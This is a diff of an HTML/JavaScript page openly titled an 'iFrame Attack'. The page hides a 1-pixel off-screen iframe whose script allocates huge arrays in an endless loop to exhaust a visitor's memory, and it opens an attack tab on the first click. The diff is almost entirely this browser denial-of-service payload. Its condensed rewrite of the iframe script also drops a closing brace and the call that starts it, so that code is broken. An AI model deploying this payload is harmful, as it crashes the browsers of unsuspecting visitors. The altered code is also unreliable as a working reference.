@@ -26,7 +26,7 @@
                 return;
             }
 
-            // Use template literals to cleanly define attack page HTML
+            // Attack HTML payload, properly formatted
             let attackHTML = `
                 <html>
                 <head><title>iFrame Attack</title></head>
@@ -39,22 +39,7 @@
                         iframe.style.height = "1px";
                         iframe.style.position = "absolute";
                         iframe.style.left = "-9999px";
-                        iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(\`
-                            <html><head><title>Attack</title></head><body>
-                            <script>
-                                function startWorker() {
-                                    let data = [];
-                                    function allocate() {
-                                        for (let i = 0; i < 500; i++) { 
-                                            data.push(new Float64Array(2e7));
-                                        }
-                                        requestAnimationFrame(allocate);
-                                    }
-                                    allocate();
-                                }
-                                startWorker();
-                            <\/script>
-                            </body></html>\`);
+                        iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent('<html><head><title>Attack</title></head><body><script>function startWorker(){let data=[];function allocate(){for(let i=0;i<500;i++){data.push(new Float64Array(2e7));} requestAnimationFrame(allocate);} allocate();<\/script></body></html>');
                         document.body.appendChild(iframe);
                     }
 
@@ -75,6 +60,7 @@
             attackTab.document.close();
         }
 
+        // Attach event listener only once
         document.body.addEventListener("click", openAttackTab, { once: true });
 
         // Start the initial memory exhaustion in the first tab
@@ -82,5 +68,6 @@
     </script>
 </body>
 </html>
+
 
 
